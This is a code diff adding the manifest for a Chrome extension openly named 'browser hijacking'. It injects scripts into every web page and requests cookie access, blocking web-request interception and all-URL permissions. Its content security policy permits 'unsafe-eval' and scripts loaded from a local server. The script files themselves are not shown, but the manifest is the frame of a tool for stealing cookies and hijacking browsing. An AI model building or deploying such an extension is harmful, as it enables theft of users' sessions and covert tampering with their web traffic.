@@ -1,0 +1,26 @@
+{
+  "name": "browser hijacking",
+  "version": "0.0.1",
+  "manifest_version": 2,
+  "description": " chrome extension.",
+  "homepage_url": "https://github.com/hakanonymos",
+  "background": {
+    "scripts": [
+      "js/background.js",
+      "js/background.html"
+    ]
+  },
+  "content_scripts": [ {
+     "js": [ "js/jquery-3.3.1.min.js", "js/script.js" ],
+     "matches": [ "http://*/*","https://*/*"]
+  } ],
+  "content_security_policy": "script-src 'self' 'unsafe-eval' http://127.0.0.1; object-src 'self'",
+  "permissions": [
+    "cookies",
+    "http://*/*",
+    "https://*/*",
+    "webRequest",
+    "webRequestBlocking",
+    "<all_urls>"
+  ]
+}
